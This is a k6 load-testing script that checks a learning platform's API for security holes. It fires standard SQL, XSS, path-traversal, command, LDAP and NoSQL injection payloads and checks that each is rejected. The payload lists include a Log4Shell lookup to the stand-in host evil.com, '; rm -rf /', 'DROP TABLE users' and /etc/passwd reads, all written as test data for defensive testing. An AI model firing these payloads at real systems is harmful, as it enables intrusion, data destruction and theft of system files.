// Security Testing Suite for Gongbu Platform
import http from 'k6/http';
import { check, sleep } from 'k6';

// Test configuration
export const options = {
  vus: 10,
  duration: '5m',
  thresholds: {
    http_req_duration: ['p(95)<1000'],
    http_req_failed: ['rate<0.1'],
  },
};

// Base URL
const BASE_URL = __ENV.BASE_URL || 'https://gongbu-platform.com';

// Test data
const maliciousPayloads = [
  '<script>alert("XSS")</script>',
  '"; DROP TABLE users; --',
  '../../../etc/passwd',
  '${jndi:ldap://evil.com/a}',
  '{{7*7}}',
  'javascript:alert(1)',
  '<img src=x onerror=alert(1)>',
  '{{constructor.constructor("alert(1)")()}}',
];

// Main test function
export default function() {
  // Test 1: SQL Injection
  testSQLInjection();
  
  // Test 2: XSS (Cross-Site Scripting)
  testXSS();
  
  // Test 3: Path Traversal
  testPathTraversal();
  
  // Test 4: Command Injection
  testCommandInjection();
  
  // Test 5: LDAP Injection
  testLDAPInjection();
  
  // Test 6: NoSQL Injection
  testNoSQLInjection();
  
  // Test 7: Authentication Bypass
  testAuthenticationBypass();
  
  // Test 8: Authorization Bypass
  testAuthorizationBypass();
  
  // Test 9: Rate Limiting
  testRateLimiting();
  
  // Test 10: Input Validation
  testInputValidation();
  
  sleep(1);
}

// SQL Injection test
function testSQLInjection() {
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "' OR 1=1 --",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
  ];
  
  sqlPayloads.forEach(payload => {
    const response = http.post(`${BASE_URL}/api/auth/login`, JSON.stringify({
      email: payload,
      password: 'password'
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'SQL injection blocked': (r) => r.status === 400 || r.status === 401,
    });
  });
}

// XSS test
function testXSS() {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
  ];
  
  xssPayloads.forEach(payload => {
    const response = http.post(`${BASE_URL}/api/courses`, JSON.stringify({
      title: payload,
      description: 'Test course',
      price: 99.99
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'XSS payload sanitized': (r) => !r.body.includes(payload),
    });
  });
}

// Path Traversal test
function testPathTraversal() {
  const pathPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  ];
  
  pathPayloads.forEach(payload => {
    const response = http.get(`${BASE_URL}/api/files/${payload}`);
    
    check(response, {
      'Path traversal blocked': (r) => r.status === 400 || r.status === 403,
    });
  });
}

// Command Injection test
function testCommandInjection() {
  const commandPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '&& whoami',
    '`id`',
    '$(whoami)',
    '; rm -rf /',
  ];
  
  commandPayloads.forEach(payload => {
    const response = http.post(`${BASE_URL}/api/system/command`, JSON.stringify({
      command: payload
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'Command injection blocked': (r) => r.status === 400 || r.status === 403,
    });
  });
}

// LDAP Injection test
function testLDAPInjection() {
  const ldapPayloads = [
    '*',
    '*)(uid=*',
    '*)(|(uid=*',
    '*))(|(uid=*',
    '*)(|(objectClass=*',
  ];
  
  ldapPayloads.forEach(payload => {
    const response = http.post(`${BASE_URL}/api/auth/ldap`, JSON.stringify({
      username: payload,
      password: 'password'
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'LDAP injection blocked': (r) => r.status === 400 || r.status === 401,
    });
  });
}

// NoSQL Injection test
function testNoSQLInjection() {
  const nosqlPayloads = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.password == this.username"}',
    '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
  ];
  
  nosqlPayloads.forEach(payload => {
    const response = http.post(`${BASE_URL}/api/auth/login`, JSON.stringify({
      email: payload,
      password: 'password'
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
    
    check(response, {
      'NoSQL injection blocked': (r) => r.status === 400 || r.status === 401,
    });
  });
}

// Authentication Bypass test
function testAuthenticationBypass() {
  // Test 1: Missing authentication
  const response1 = http.get(`${BASE_URL}/api/auth/profile`);
  check(response1, {
    'Missing auth returns 401': (r) => r.status === 401,
  });
  
  // Test 2: Invalid token
  const response2 = http.get(`${BASE_URL}/api/auth/profile`, {
    headers: { 'Authorization': 'Bearer invalid_token' },
  });
  check(response2, {
    'Invalid token returns 401': (r) => r.status === 401,
  });
  
  // Test 3: Expired token
  const response3 = http.get(`${BASE_URL}/api/auth/profile`, {
    headers: { 'Authorization': 'Bearer expired_token' },
  });
  check(response3, {
    'Expired token returns 401': (r) => r.status === 401,
  });
}

// Authorization Bypass test
function testAuthorizationBypass() {
  // Test 1: Access admin endpoint as regular user
  const response1 = http.get(`${BASE_URL}/api/admin/users`);
  check(response1, {
    'Admin endpoint requires auth': (r) => r.status === 401 || r.status === 403,
  });
  
  // Test 2: Access other user's data
  const response2 = http.get(`${BASE_URL}/api/users/999/profile`);
  check(response2, {
    'Other user data requires auth': (r) => r.status === 401 || r.status === 403,
  });
  
  // Test 3: Modify other user's data
  const response3 = http.put(`${BASE_URL}/api/users/999/profile`, JSON.stringify({
    email: 'hacked@evil.com'
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  check(response3, {
    'Modify other user data requires auth': (r) => r.status === 401 || r.status === 403,
  });
}

// Rate Limiting test
function testRateLimiting() {
  const requests = [];
  
  // Send multiple requests quickly
  for (let i = 0; i < 20; i++) {
    requests.push(http.post(`${BASE_URL}/api/auth/login`, JSON.stringify({
      email: 'test@test.com',
      password: 'password'
    }), {
      headers: { 'Content-Type': 'application/json' },
    }));
  }
  
  // Check if rate limiting is working
  const rateLimitedRequests = requests.filter(r => r.status === 429);
  check(rateLimitedRequests, {
    'Rate limiting is active': (r) => r.length > 0,
  });
}

// Input Validation test
function testInputValidation() {
  // Test 1: Invalid email format
  const response1 = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify({
    email: 'invalid-email',
    password: 'password123',
    firstName: 'Test',
    lastName: 'User'
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  check(response1, {
    'Invalid email format rejected': (r) => r.status === 400,
  });
  
  // Test 2: Weak password
  const response2 = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify({
    email: 'test@test.com',
    password: '123',
    firstName: 'Test',
    lastName: 'User'
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  check(response2, {
    'Weak password rejected': (r) => r.status === 400,
  });
  
  // Test 3: Missing required fields
  const response3 = http.post(`${BASE_URL}/api/auth/register`, JSON.stringify({
    email: 'test@test.com',
    password: 'password123'
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  check(response3, {
    'Missing required fields rejected': (r) => r.status === 400,
  });
  
  // Test 4: Oversized input
  const largeString = 'a'.repeat(10000);
  const response4 = http.post(`${BASE_URL}/api/courses`, JSON.stringify({
    title: largeString,
    description: 'Test course',
    price: 99.99
  }), {
    headers: { 'Content-Type': 'application/json' },
  });
  check(response4, {
    'Oversized input rejected': (r) => r.status === 400,
  });
}
